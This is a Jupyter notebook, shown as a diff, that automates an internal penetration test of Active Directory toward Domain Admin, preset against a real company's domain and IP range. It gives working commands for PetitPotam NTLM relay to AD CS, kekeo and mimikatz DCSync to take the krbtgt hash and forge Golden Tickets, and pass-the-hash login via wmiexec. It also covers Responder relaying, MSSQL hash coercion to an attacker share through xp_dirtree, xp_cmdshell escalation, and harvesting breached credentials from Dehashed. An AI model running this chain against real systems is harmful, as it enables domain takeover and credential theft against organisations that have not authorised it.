@@ -1,0 +1,763 @@
+{
+ "cells": [
+  {
+   "cell_type": "markdown",
+   "id": "388e44bc-f5e0-4da8-999d-3838cb45fb93",
+   "metadata": {
+    "jp-MarkdownHeadingCollapsed": true,
+    "tags": []
+   },
+   "source": [
+    "# Description\n",
+    "Automating internal penetration testing or at least creating a checklist. If everything goes well, you will have DA!"
+   ]
+  },
+  {
+   "cell_type": "markdown",
+   "id": "b73731d8-0d48-45cf-aa00-2c98a579da0f",
+   "metadata": {
+    "jp-MarkdownHeadingCollapsed": true,
+    "tags": []
+   },
+   "source": [
+    "# Setup\n",
+    "Prior to running any cells assign a value to the variables and run the cell. This will change the targets for enumeration without needing to modify the script parameters. "
+   ]
+  },
+  {
+   "cell_type": "code",
+   "execution_count": null,
+   "id": "b8e562ae-5482-4f75-b74b-559d25b9b9cc",
+   "metadata": {},
+   "outputs": [],
+   "source": [
+    "SCAN_TYPE = \"A\" #P=Passive, no interaction with the org's assets (except DNS requests). N=Normal, non-malicious TCP/HTTP requests sent. A=Aggressive, a number of malicious HTTP requests sent for vulnerability identification.\n",
+    "DOMAIN = \"tesla.com\"  #FQDN (required)\n",
+    "IP_RANGE = \"184.30.18.0/24\" #nmap format. If empty, the IPs of subdomains will be used\n",
+    "ORG_NAME = \"tesla\"  #this will be used in linkedIn search and cloud enumeration (required)\n",
+    "FOLDER_NAME = \"tesla\" #this folder will contain the discovered recon data (required)\n",
+    "USERNAME_FORMAT = \"{f}{last}\" #e.g. {f}{last}, check hunter.io if you're not sure about the email format\n",
+    "DEHASHED_USER = \"\" #dehashed username\n",
+    "DEHASHED_KEY = \"\"  #dehashed API Key\n",
+    "DOMAIN_USER = \"\" #if you have a domain username or managed to compromise one during the engagement\n",
+    "DOMAIN_Password = \"\" #password for the above user"
+   ]
+  },
+  {
+   "cell_type": "code",
+   "execution_count": null,
+   "id": "74ea24eb-fa4b-4ca0-9c40-8813e2e3342f",
+   "metadata": {},
+   "outputs": [],
+   "source": [
+    "print(\"Setting up project folders and files\")\n",
+    "!mkdir $FOLDER_NAME\n",
+    "!nmap -sL -n $IP_RANGE | grep 'Nmap scan report for' | cut -f 5 -d ' ' > $FOLDER_NAME/IP_Range.txt\n",
+    "!mkdir $FOLDER_NAME/Screenshots\n",
+    "print (\"Done!\")"
+   ]
+  },
+  {
+   "cell_type": "markdown",
+   "id": "f081cb1d-fc8d-4f96-bc1f-7dc2f2c0aaca",
+   "metadata": {
+    "jp-MarkdownHeadingCollapsed": true,
+    "tags": []
+   },
+   "source": [
+    "# NMAP (Unauthenticated)\n",
+    "All port scan is not included as it may take a while, add flags as per your requirements."
+   ]
+  },
+  {
+   "cell_type": "code",
+   "execution_count": null,
+   "id": "d330caa3-b91f-4d60-8126-55a454fbe087",
+   "metadata": {},
+   "outputs": [],
+   "source": [
+    "if IP_RANGE != \"\" and SCAN_TYPE != \"P\":\n",
+    "        !nmap -Pn $IP_RANGE >> $FOLDER_NAME/nmap.txt"
+   ]
+  },
+  {
+   "cell_type": "markdown",
+   "id": "a94b90c3-009f-46a7-b9be-a1684e82b175",
+   "metadata": {
+    "jp-MarkdownHeadingCollapsed": true,
+    "tags": []
+   },
+   "source": [
+    "# Identify DCs and Check For Common Vulns (Unauthenticated)\n",
+    "\n",
+    "We can use nslookup on our host machine (Windows) to find DC:  nslookup -type = SRV _ldap._tcp.dc._msdcs.//DOMAIN/\n",
+    "\n"
+   ]
+  },
+  {
+   "cell_type": "markdown",
+   "id": "b6e6304b-f73b-46d6-b7c8-051ff7b5e37e",
+   "metadata": {
+    "jp-MarkdownHeadingCollapsed": true,
+    "tags": []
+   },
+   "source": [
+    "### Kerbrute \n",
+    "\n",
+    "It can used to identify Kerberos servers: https://github.com/ropnop/kerbrute"
+   ]
+  },
+  {
+   "cell_type": "code",
+   "execution_count": null,
+   "id": "431a1d02-221f-40c9-a495-3759457de3ef",
+   "metadata": {},
+   "outputs": [],
+   "source": [
+    "!echo testuser > $FOLDER_NAME/username.txt\n",
+    "!kerbrute userenum -d $DOMAIN username.txt | cut -d> -f2 |cut -d: -f1|tr -d ' '|anew $FOLDER_NAME/DCs.csv\n",
+    "print(\"Finding DCs IP addresses... \")\n",
+    "!dnsx -silent -a -resp -l $FOLDER_NAME/DCs.csv|cut -d \" \" -f 2|cut -d \"]\" -f 1 |cut -d \"[\" -f 2 >> $FOLDER_NAME/DCs_IP.csv\n",
+    "!rm $FOLDER_NAME/username.txt"
+   ]
+  },
+  {
+   "cell_type": "markdown",
+   "id": "98c3f3f7-3981-4c2f-8ebf-553134b4cb63",
+   "metadata": {},
+   "source": [
+    "### ZeroLogon\n",
+    "\n",
+    "Script: https://github.com/rth0pper/zerologon\n",
+    "\n",
+    "You'd need to enter NETBIOS Name of the target DC. The following script will only check for the first DC in DCs_IPs.csv (it will not exploit the vulnerability)."
+   ]
+  },
+  {
+   "cell_type": "code",
+   "execution_count": 2,
+   "id": "a935e7be-b367-4ea1-aec5-d4bb6949eec5",
+   "metadata": {},
+   "outputs": [
+    {
+     "name": "stdout",
+     "output_type": "stream",
+     "text": [
+      "head: cannot open '/DCs_IP.txt' for reading: No such file or directory\n",
+      "python3: can't open file 'zerologon.py': [Errno 2] No such file or directory\n"
+     ]
+    }
+   ],
+   "source": [
+    "!DC=$(head -n 1 $FOLDER_NAME/DCs_IP.txt)\n",
+    "!python3 zerologon.py NETBOIS_NAME $DC"
+   ]
+  },
+  {
+   "cell_type": "markdown",
+   "id": "16716ef1-5848-4817-8f89-6c53ad8d489b",
+   "metadata": {
+    "jp-MarkdownHeadingCollapsed": true,
+    "tags": []
+   },
+   "source": [
+    "# PetitPotam -> NTLM relay to ADCS -> DA (Unauthenticated)"
+   ]
+  },
+  {
+   "cell_type": "markdown",
+   "id": "71b95c44-a775-4142-a2a0-ac8b71ed04cc",
+   "metadata": {},
+   "source": [
+    "### How it works\n",
+    "\n",
+    "This attack utilizies two vulnerabilities, MS-EFSRPC – AKA PetitPotam and Credential Relaying abusing the AD CS role. An attacker can trigger a Domain Controller using PetitPotam to NTLM relay credentials to a host of choice. The Domain Controller’s NTLM Credentials can then be relayed to the Active Directory Certificate Services (AD CS) Web Enrollment pages, and a DC certificate can be enrolled. This certificate can then be used to request a TGT (Ticket Granting Ticket) and compromise the entire domain through Pass-The-Ticket. \n",
+    "\n",
+    "Below provides a high level overview of how the attack works:\n",
+    "* Setup an NTLM relay listener on a box you control, so that incoming authentications are relayed to the misconfigured ADCS;\n",
+    "* Force the target DC to authenticate (using PetitPotam or PrintSpooler trick) to the box running your NTLM relay;\n",
+    "* Target DC attempts to authenticate to your NTLM relay;\n",
+    "* NTLM relay receives the DC\\$ machine account authentication and relays it to the ADCS;\n",
+    "* ADCS provides a certificate for the target DC\\$ computer account;\n",
+    "* Use the target DC's computer account certificate to request its Kerberos TGT;\n",
+    "* Use target DC's computer account TGT to perform DCSync and pull the NTLM hash of krbtgt;\n",
+    "* Use krbtgt NTLM hash to create Golden Tickets that allow you to impersonate any domain user, including Domain Admin.\n",
+    "\n",
+    "Below are some of the conditions making an AD environment vulnerable to ADCS + NTLM relay attack:\n",
+    "* ADCS is configured to allow NTLM authentication;\n",
+    "* NTLM authentication is not protected by EPA or SMB signing;\n",
+    "* ADCS is running either of these services:\n",
+    "  * Certificate Authority Web Enrollment\n",
+    "  * Certificate Enrollment Web Service\n",
+    "\n",
+    "References: \n",
+    "* [Dirk-jan Mollema: NTLM relaying to AD CS - On certificates, printers and a little hippo](https://dirkjanm.io/ntlm-relaying-to-ad-certificate-services/)\n",
+    "* [Truesec: Using PetitPotam to NTLM Relay to Domain Administrator ](https://www.truesec.com/hub/blog/from-stranger-to-da-using-petitpotam-to-ntlm-relay-to-active-directory)\n",
+    "* [ADCS + PetitPotam NTLM Relay: Obtaining krbtgt Hash with Domain Controller Machine Certificate](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/adcs-+-petitpotam-ntlm-relay-obtaining-krbtgt-hash-with-domain-controller-machine-certificate)\n",
+    "* https://github.com/topotam/PetitPotam\n",
+    "* https://github.com/gentilkiwi/mimikatz\n",
+    "* https://github.com/gentilkiwi/kekeo"
+   ]
+  },
+  {
+   "cell_type": "markdown",
+   "id": "04f26a13-a603-459f-a31b-c08ba3427934",
+   "metadata": {
+    "tags": []
+   },
+   "source": [
+    "### Step 1 - Find AD CS\n",
+    "\n",
+    "Check if DC has a web service running, use it's certificate to find out AD CS?\n",
+    "\n",
+    "We can also use certify.exe to enumerate certificate templates and find vulnerabilities: https://github.com/GhostPack/Certify"
+   ]
+  },
+  {
+   "cell_type": "markdown",
+   "id": "b1d1338e-08dd-47b9-b020-c6c7f337c595",
+   "metadata": {},
+   "source": [
+    "### Step 2 - Start ntlmrelay for relaying hashes to the AD CS\n",
+    "Run the following command outside of docker, jupyter does not allow executing of parrallel cells.\n",
+    "\n",
+    "sudo python3 ntlmrelayx.py -debug -smb2support --target http://ADCS/certsrv/certfnsh.asp --adcs --template DomainController\n",
+    "\n",
+    "If above command results in error related to templates, try other templates such as \"KerberosAuthentication\" or \"Computer\" or \"User\""
+   ]
+  },
+  {
+   "cell_type": "markdown",
+   "id": "60dc7b01-2d52-4308-8384-ce808500f85b",
+   "metadata": {},
+   "source": [
+    "### Step 3 - PetitPotam to force the target DC to authenticate to our attacking box\n",
+    "The below is targetting only first DC in the DCs_IP list.\n",
+    "\n",
+    "Note: there are several other ways to trigger NTLM authentication, including Responder, mitm6, PrinterBug, PrintNightmare, etc.)\n",
+    "\n",
+    "After execution running it, check your ntlmrelay terminal, it should've relayed hash to ADCS and obtained a certificate\n",
+    "\n"
+   ]
+  },
+  {
+   "cell_type": "code",
+   "execution_count": null,
+   "id": "f8321960-8b46-4211-9f2c-65ceeb2ac269",
+   "metadata": {},
+   "outputs": [],
+   "source": [
+    "!DC=$(head -n 1 $FOLDER_NAME/DCs_IP.txt)\n",
+    "!python3 Petitpotam.py <listener> $DC  #fillout the attacking box IP where ntlmrelay is running"
+   ]
+  },
+  {
+   "cell_type": "markdown",
+   "id": "e7956e75-eca8-413a-80b4-5edf1219beca",
+   "metadata": {},
+   "source": [
+    "### Step 4 - Mimikatz and Keko for TGT request, the following needs to be done in Windows\n",
+    "\n",
+    "Check this out demo from Benjamin Deply: https://user-images.githubusercontent.com/2307945/126882835-eb32d87d-e010-4e1f-9067-784ac838f93c.gif\n",
+    "\n",
+    "**KEKO for requesting TGT for our compromised DC machine account**\n",
+    "* curl https://github.com/gentilkiwi/kekeo/releases/download/2.2.0-20210723/kekeo.zip -o kekeo.zip\n",
+    "* tar -xf .\\kekeo.zip\n",
+    "* .\\x64\\kekeo.exe\n",
+    "* base64 /input:on\n",
+    "* tgt::ask /pfx:\\<base64 cert from relay\\> /user:dc-101$ /domain:spencer.local /ptt\n",
+    "* exit\n",
+    "\n",
+    "**Mimikatz for DCSync**\n",
+    "* curl https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20210724/mimikatz_trunk.zip -o mimikatz.zip\n",
+    "* tar -xf mimikatz.zip\n",
+    "* .\\x64\\mimikatz.exe\n",
+    "* lsadump::dcsync /domain:spencer.local /user:krbtgt # note down the ntlm hash\n",
+    "* lsadump::dcsync /domain:spencer.local /user:\\<any user\\>  #better request administrator's hash \n",
+    "* exit"
+   ]
+  },
+  {
+   "cell_type": "markdown",
+   "id": "8391bdda-1782-4bc9-a04d-ee72fd4d424d",
+   "metadata": {},
+   "source": [
+    "### Step 5 - Login to DC\n",
+    "\n",
+    "Again several ways, but wmiexec may be the stealthiest!"
+   ]
+  },
+  {
+   "cell_type": "code",
+   "execution_count": null,
+   "id": "b2299efc-1f78-4171-a458-18a4e6d98a67",
+   "metadata": {},
+   "outputs": [],
+   "source": [
+    "!DC=$(head -n 1 $FOLDER_NAME/DCs_IP.txt)\n",
+    "!wmiexec.py -hashes :<NT HASH> $DOMAIN/<USER>@$DC"
+   ]
+  },
+  {
+   "cell_type": "markdown",
+   "id": "684abb74-a586-4b4f-bb4a-8840b82d575a",
+   "metadata": {
+    "jp-MarkdownHeadingCollapsed": true,
+    "tags": []
+   },
+   "source": [
+    "# Relaying hashes using Responder and NTLMRelayx"
+   ]
+  },
+  {
+   "cell_type": "markdown",
+   "id": "0d700a1c-75c5-454b-ac6e-3ed8ad3cc3e6",
+   "metadata": {},
+   "source": [
+    "### RunFinger\n",
+    "\n",
+    "Let's first find out which hosts do not require SMB singning:"
+   ]
+  },
+  {
+   "cell_type": "code",
+   "execution_count": null,
+   "id": "197efea3-17cb-4223-b4ae-7cd83971cc63",
+   "metadata": {},
+   "outputs": [],
+   "source": [
+    "!RunFinger.py -i TARGET_SUBNET | grep -B1 'Signing: False' |cut -f 4 -d ' ' |grep -oE \"([0-9]{1,3}\\.){3}[0-9]{1,3}\" >> noSMBSigning.txt"
+   ]
+  },
+  {
+   "cell_type": "markdown",
+   "id": "0604d3d2-ae9c-40ca-bc66-b8f8205dd2b8",
+   "metadata": {},
+   "source": [
+    "### Responder and ntlmrelayx\n",
+    "\n",
+    "Use other notebooks to start Responder and ntlmrelayx. Command are below (Remmebr to turn off SMB server in /etc/responder/responder.conf. ):\n",
+    "\n",
+    "*sudo impacket-responder -I eht0*\n",
+    "\n",
+    "*impacket-ntlmrelayx -debug -smb2support -tf noSMBSigning.txt --no-http-server -socks --output-file ntlmrelayx.logs*"
+   ]
+  },
+  {
+   "cell_type": "markdown",
+   "id": "e356522e-3acb-4775-874a-dfa4e771f6c0",
+   "metadata": {
+    "jp-MarkdownHeadingCollapsed": true,
+    "tags": []
+   },
+   "source": [
+    "# User Enumeration (Unauthenticated/Authenticted)\n",
+    "\n",
+    "Few ways ways to enumerate users. Scraping from Linked, quering SAMRPC and finding users from breached databases. "
+   ]
+  },
+  {
+   "cell_type": "markdown",
+   "id": "50df24a4-991a-4b14-b279-828e23d3e9ff",
+   "metadata": {
+    "tags": []
+   },
+   "source": [
+    "### User Enumeration from Linked\n",
+    "CrossLinked: https://github.com/m8r0wn/CrossLinked\n",
+    "\n",
+    "Searching users on LinkedIn and creating email. \n",
+    "\n",
+    "For better results, run the following cell multiple times. Try different permutations of the company name, check company's linkedin page and try that name!"
+   ]
+  },
+  {
+   "cell_type": "code",
+   "execution_count": null,
+   "id": "aff77d87-8829-44b1-a5b0-24d2ef6a79f8",
+   "metadata": {},
+   "outputs": [],
+   "source": [
+    "if EMAIL_FORMAT != \"\":\n",
+    "    print(\"Finding users on LinkedIn... \")\n",
+    "    !python3 ../crosslinked/crosslinked.py -f $EMAIL_FORMAT $ORG_NAME -o crosslinked.csv\n",
+    "    !cat crosslinked.csv |sort -u |anew $FOLDER_NAME/Users.csv\n",
+    "    !rm crosslinked.csv\n",
+    "    print(\"Done. The file ./{}/Emails.csv is updated!\".format(FOLDER_NAME))"
+   ]
+  },
+  {
+   "cell_type": "markdown",
+   "id": "aefacfd9-a5fb-40ca-a070-41c2db885675",
+   "metadata": {},
+   "source": [
+    "### User Enumeration from SAMRPC\n",
+    "\n",
+    "The SAMRPC protocol makes it possible for a low privileged user (or an unauthenticatd user if misconfigured) to query a machine on a network for data. For example, a user can use SAMRPC to enumerate users, including privileged accounts such as local or domain administrators, or to enumerate groups and group memberships from the local SAM and Active Directory. The following command can help enumerating users (you can execute it even without the creds). It will try one of the DCs (first one in the list of DCs_IP.txt), try other DCs if it coudn't call SAMRPC.\n",
+    "\n",
+    "Reference: https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/network-access-restrict-clients-allowed-to-make-remote-sam-calls"
+   ]
+  },
+  {
+   "cell_type": "code",
+   "execution_count": null,
+   "id": "8f43e9b1-c33c-4a2f-aa37-428fe77662b9",
+   "metadata": {},
+   "outputs": [],
+   "source": [
+    "print(\"Querying DC to enumerate users... \")\n",
+    "!DC=$(head -n 1 $FOLDER_NAME/DCs_IP.txt)\n",
+    "!crackmapexec smb $DC -u $DOMAIN_USER -p $DOMAIN_PASSWORD --users | grep $DOMAIN |cut -d\\\\ -f2 |anew $FOLDER_NAME/Users.csv"
+   ]
+  },
+  {
+   "cell_type": "markdown",
+   "id": "1a01c00b-0b21-4893-8d3c-38de79d8565e",
+   "metadata": {},
+   "source": [
+    "### Breached database from Dehashed\n",
+    "\n",
+    "https://dehashed.com\n",
+    "\n",
+    "It will harvest credentials from breached databases, the Dehashed username and API key is required.  \n"
+   ]
+  },
+  {
+   "cell_type": "code",
+   "execution_count": null,
+   "id": "e56be8e1-f94b-4823-b9eb-0a4b0375193b",
+   "metadata": {},
+   "outputs": [],
+   "source": [
+    "%%bash  -s \"$DOMAIN\" \"$DEHASHED_USER\" \"$DEHASHED_KEY\" \"$FOLDER_NAME\"\n",
+    "if [ \"$3\" != \"\" ]; then\n",
+    "echo \"Dumping breached databses from dehashed ...\"\n",
+    "echo \"id, email, username, password, hashed_password, name, database_name\" >> $4/Dehashed.csv\n",
+    "curl \"https://api.dehashed.com/search?query=domain:$1&size=4000\" -u $2:$3 -H 'Accept: application/json' | jq -r '.entries[] | {id: .id,email: .email,username: .username,password: .password,hashed_password: .hashed_password,name: .name,database_name: .database_name} | select((.password != null and .password!= \"\") )' | jq -r '[.[]] | @csv'|anew $4/Dehashed.csv\n",
+    "echo \"Done. $4/Dehashed.csv is updated!\"\n",
+    "echo \"Updating Email.csv with newly found Email addresses!\"\n",
+    "grep -E -o \"\\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\\.[A-Za-z]{2,6}\\b\" $4/Dehashed.csv |cut -d@ -f1|anew $4/Users.csv\n",
+    "fi"
+   ]
+  },
+  {
+   "cell_type": "markdown",
+   "id": "d875d121-f8de-436d-82f9-9dc998aecd5f",
+   "metadata": {},
+   "source": [
+    "### Valid Users\n",
+    "\n",
+    "Using kerbrute: https://github.com/ropnop/kerbrute\n"
+   ]
+  },
+  {
+   "cell_type": "code",
+   "execution_count": null,
+   "id": "723dbfaf-c4f8-4b60-aab9-602b390dbcc7",
+   "metadata": {},
+   "outputs": [],
+   "source": [
+    "!./kerbrute userenum -d $DOMAIN $FOLDER_NAME/Users.csv |grep \"VALID\" |grep -E -o \"\\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\\.[A-Za-z]{2,6}\\b\" |cut -d@ -f1|anew $FOLDER_NAME/Valid_Users.csv"
+   ]
+  },
+  {
+   "cell_type": "markdown",
+   "id": "68aaf8ee-0e07-4f19-8fac-15517bf59602",
+   "metadata": {
+    "jp-MarkdownHeadingCollapsed": true,
+    "tags": []
+   },
+   "source": [
+    "# Web Stuff (Unauthenticated)"
+   ]
+  },
+  {
+   "cell_type": "markdown",
+   "id": "b8e30296-8568-4352-b9f9-320a5eee1b57",
+   "metadata": {
+    "jp-MarkdownHeadingCollapsed": true,
+    "tags": []
+   },
+   "source": [
+    "### HTTP Probing\n",
+    "Probing in-scope domains using httpx: https://github.com/projectdiscovery/httpx"
+   ]
+  },
+  {
+   "cell_type": "code",
+   "execution_count": null,
+   "id": "410cbf8c-cfd5-46c3-8eac-f25c8e197d8b",
+   "metadata": {},
+   "outputs": [],
+   "source": [
+    "if SCAN_TYPE != \"P\":\n",
+    "    print(\"Probing using httpx...\")\n",
+    "    if IP_RANGE == \"\":   \n",
+    "        !cp $FOLDER_NAME/Subdomains.csv subs.csv\n",
+    "        !cat subs.csv |dnsx -silent |httpx -p -silent >> httpx.csv\n",
+    "        !cat httpx.csv |anew $FOLDER_NAME/Probed_Subdomains.csv\n",
+    "        print(\"Done. The file ./{}/Probed_Subdomains.csv is updated!\".format(FOLDER_NAME))\n",
+    "    else:\n",
+    "        !cp $FOLDER_NAME/In_Scope_Subdomains.csv subs.csv\n",
+    "        !cat subs.csv |dnsx -silent|httpx -silent >> httpx.csv\n",
+    "        !cat httpx.csv |anew $FOLDER_NAME/Probed_In_Scope_Subdomains.csv\n",
+    "        print(\"Done. The file ./{}/Probed_In_Scope_Subdomains.csv is updated!\".format(FOLDER_NAME))\n",
+    "    !rm subs.csv\n",
+    "    !rm httpx.csv"
+   ]
+  },
+  {
+   "cell_type": "markdown",
+   "id": "34df4c86-c7a9-45b4-ae4b-57c380d4f460",
+   "metadata": {
+    "tags": []
+   },
+   "source": [
+    "### Screenshoting\n",
+    "\n",
+    "Eyewitness: https://github.com/FortyNorthSecurity/EyeWitness"
+   ]
+  },
+  {
+   "cell_type": "code",
+   "execution_count": null,
+   "id": "c3fb7afb-d91f-44d6-b74f-8e6bf7a94b5d",
+   "metadata": {},
+   "outputs": [],
+   "source": [
+    "%%bash -s \"$IP_RANGE\" \"$FOLDER_NAME\" \"$SCAN_TYPE\"\n",
+    "if [ \"$3\" != \"P\" ]; then\n",
+    "echo \"Screenthoting probed domians using EyeWitness...\"\n",
+    "if [ \"$1\" == \"\" ]; then\n",
+    "    cp $2/Probed_Subdomains.csv subs.csv\n",
+    "    python3 ../EyeWitness/Python/EyeWitness.py --delay 2 --no-prompt -f subs.csv -d $2/Screenshots/\n",
+    "    echo \"Done. The screenshots for Probed_Subdomains are saved in ./$2/screenshots/report.html\"\n",
+    "else \n",
+    "    cp $2/Probed_In_Scope_Subdomains.csv subs.csv\n",
+    "    python3 ../EyeWitness/Python/EyeWitness.py --delay 2 --no-prompt -f subs.csv -d $2/Screenshots/\n",
+    "    echo \"Done. The screenshots for Probed_In_Scope_Subdomains are saved in ./{}/screenshots/report.html\"\n",
+    "fi\n",
+    "rm subs.csv\n",
+    "fi"
+   ]
+  },
+  {
+   "cell_type": "markdown",
+   "id": "20e48e6c-c11e-4f0b-9f33-585a7d0dee15",
+   "metadata": {
+    "tags": []
+   },
+   "source": [
+    "### Nuclei Scan\n",
+    "Nuclei is a web scanner, it can detect technologies in use, identify CORS and TLS issues, and can scan for famous zero days such as log4j. Give it a go, it's pretty good!\n",
+    "\n",
+    "**This might take sometime depending on the number of domains. It is a bit noisey, may send hundreds of GET/POST requests, be careful in a red team engagement.**\n",
+    "\n",
+    "Nuclei: https://github.com/projectdiscovery/nuclei"
+   ]
+  },
+  {
+   "cell_type": "code",
+   "execution_count": null,
+   "id": "2abcc504-40e7-4b37-a437-748f2dac9c27",
+   "metadata": {},
+   "outputs": [],
+   "source": [
+    "if SCAN_TYPE == \"A\":\n",
+    "    print(\"Scanning probed domains using nuclei...\")\n",
+    "    !nuclei -update\n",
+    "    !nuclei -update-templates #let's first update nuclei database\n",
+    "    if IP_RANGE == \"\":\n",
+    "        !cp $FOLDER_NAME/Probed_Subdomains.csv subs.csv\n",
+    "        !nuclei -l subs.csv |anew $FOLDER_NAME/Nuclei.txt\n",
+    "        print(\"Done. Nuclei resuts for Probed_Subdomains saved in  ./{}/Nuclei.txt\".format(FOLDER_NAME))\n",
+    "    else:\n",
+    "        !cp $FOLDER_NAME/Probed_In_Scope_Subdomains.csv subs.csv\n",
+    "        !nuclei -l subs.csv |anew $FOLDER_NAME/Nuclei.txt\n",
+    "        print(\"Done. Nuclei resuts for Probed_In_Scope_Subdomains saved in  ./{}/Nuclei.txt\".format(FOLDER_NAME))\n",
+    "    !rm subs.csv        \n",
+    "    print(\"Note: Nuclei.txt will not be part of final excel file!\")"
+   ]
+  },
+  {
+   "cell_type": "markdown",
+   "id": "fb0c916f-9fb3-4153-87e0-38f758afb035",
+   "metadata": {
+    "jp-MarkdownHeadingCollapsed": true,
+    "tags": []
+   },
+   "source": [
+    "# MSSQL Adventures (Unauthenticated/Authenticated)"
+   ]
+  },
+  {
+   "cell_type": "markdown",
+   "id": "af8b7516-79f5-4c67-bdad-cbba9918da83",
+   "metadata": {
+    "jp-MarkdownHeadingCollapsed": true,
+    "tags": []
+   },
+   "source": [
+    "### Find servers and check guest access\n",
+    "\n",
+    "It can be executed without credentials."
+   ]
+  },
+  {
+   "cell_type": "code",
+   "execution_count": null,
+   "id": "542dd0af-3d9a-41e5-a69b-df7127d121e7",
+   "metadata": {},
+   "outputs": [],
+   "source": [
+    "!crackmapexec mssql IP_Range.txt -u $DOMAIN_USER -p $DOMAIN_PASSWORD"
+   ]
+  },
+  {
+   "cell_type": "markdown",
+   "id": "4f17b5f9-0609-42a3-9a38-7173ac2abf33",
+   "metadata": {
+    "jp-MarkdownHeadingCollapsed": true,
+    "tags": []
+   },
+   "source": [
+    "### Capture MSSQL Service Account Hash via xp_dirtree\n",
+    "\n",
+    "Usually all domains users can login to MSSQL servers. We can use a domain account and coerce the server to talk to our attacking machine using xp_dirtree stored procedure. Once the NTLMv2 challenge-response is captured, we can relay it to other hosts where SMB sining is not enabled or try cracking the passowrd.\n",
+    "\n",
+    "**Use MSSQL client to login:**\n",
+    "\n",
+    "*impacket-mssql \\\\$DOMAIN/\\\\$DOMAIN_USER@SQL-SERVER-IP -windows-auth*\n",
+    "\n",
+    "\n",
+    "For capturing the NTLMv2 challenge-response. **On attacking machine:** \n",
+    "\n",
+    "*impacket-smbserver ShareName ./*\n",
+    "\n",
+    "For relaying hashes to other hosts. **On attacking machine:**\n",
+    "\n",
+    "*impacket-ntlmrelayx -debug -smb2support -tf noSMBSigning.txt --no-http-server -socks --output-file ntlmrelayx.logs*\n",
+    "\n",
+    "**On MSSQL terminal:**\n",
+    "\n",
+    "*exec MASTER.sys.xp_dirtree \"\\\\\\ATTACKING-IP\\\\ShareName\", 1,1;*\n",
+    "\n"
+   ]
+  },
+  {
+   "cell_type": "markdown",
+   "id": "b7ee556a-cefd-4f20-aab3-c7334967eaee",
+   "metadata": {
+    "tags": []
+   },
+   "source": [
+    "### MSSQL Enum\n",
+    "\n",
+    "Check if impersonation is enabled, can be abused if a user can impersonate DBO:\n",
+    "\n",
+    "*SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';*\n",
+    "\n",
+    "Find linked servers:\n",
+    "\n",
+    "*EXEC sp_linkedservers;*\n",
+    "\n",
+    "Check version and system user on linked servers:\n",
+    "\n",
+    "*select version from openquery(\"SERVER-NAME\", 'select @@version as version');\n",
+    "select version from openquery(\"SERVER-Name\", 'select system_user as version');*\n",
+    "\n",
+    "\n",
+    "If xp_cmdshell is disabled and user has impersonation:\n",
+    "\n",
+    "*EXECUTE AS LOGIN = 'sa';\n",
+    "EXEC sp_configure 'show advanced options', 1;RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;\n",
+    "EXEC xp_cmdshell whoami*"
+   ]
+  },
+  {
+   "cell_type": "markdown",
+   "id": "b14f24f0-7f54-4a8f-a9a2-1a912b4efa13",
+   "metadata": {
+    "jp-MarkdownHeadingCollapsed": true,
+    "tags": []
+   },
+   "source": [
+    "# Excel and ZIP"
+   ]
+  },
+  {
+   "cell_type": "code",
+   "execution_count": null,
+   "id": "02f09ed2-8c1b-4e6c-9df6-6196b0f4c64b",
+   "metadata": {},
+   "outputs": [],
+   "source": [
+    "!sudo pip3 install pandas\n",
+    "\n",
+    "import pandas as pd\n",
+    "import os\n",
+    "import csv\n",
+    "import glob\n",
+    "import xlsxwriter\n",
+    "import openpyxl\n",
+    "\n",
+    "\n",
+    "#path to parse to and read files from\n",
+    "path = \"/home/discovery/work/{}/\".format(FOLDER_NAME)\n",
+    "\n",
+    "#all files ending in .csv\n",
+    "all_files = glob.glob(os.path.join(path, \"*.csv\"))\n",
+    "\n",
+    "#initialize writer\n",
+    "writer = pd.ExcelWriter('/home/discovery/work/' + FOLDER_NAME + '/' + FOLDER_NAME + '_OSINT.xlsx', engine='xlsxwriter', options={'strings_to_formulas': False})\n",
+    "\n",
+    "#write all files into excel from dataframes and name worksheet by filename \n",
+    "print(\"The following files are being parsed to \" + path + \":\") \n",
+    "print(\"\")\n",
+    "for f in all_files:\n",
+    "    if os.stat(f).st_size == 0:\n",
+    "        pass\n",
+    "    else:\n",
+    "        df = pd.read_csv(f)\n",
+    "        print(f)\n",
+    "        df.to_excel(writer, sheet_name=os.path.basename(f),index=False)\n",
+    "\n",
+    "writer.save()  \n",
+    "\n",
+    "print(\"\")\n",
+    "print(\"Parsing of \" + FOLDER_NAME + \"_OSINT.xlsx Complete\")\n",
+    "\n",
+    "\n",
+    "#delete csv files if excel creation was successful\n",
+    "if os.path.exists('/home/discovery/work/' + FOLDER_NAME + '/' + FOLDER_NAME + '_OSINT.xlsx'):\n",
+    "    !rm $FOLDER_NAME/*.csv\n",
+    "\n",
+    "#create zip file containing all the results\n",
+    "import shutil\n",
+    "shutil.make_archive('/home/discovery/work/' + FOLDER_NAME, 'zip', '/home/discovery/work/' + FOLDER_NAME)\n",
+    "print(\"Results saved in \" + FOLDER_NAME + \".zip in ~/work\")"
+   ]
+  }
+ ],
+ "metadata": {
+  "kernelspec": {
+   "display_name": "Python 3 (ipykernel)",
+   "language": "python",
+   "name": "python3"
+  },
+  "language_info": {
+   "codemirror_mode": {
+    "name": "ipython",
+    "version": 3
+   },
+   "file_extension": ".py",
+   "mimetype": "text/x-python",
+   "name": "python",
+   "nbconvert_exporter": "python",
+   "pygments_lexer": "ipython3",
+   "version": "3.9.10"
+  }
+ },
+ "nbformat": 4,
+ "nbformat_minor": 5
+}
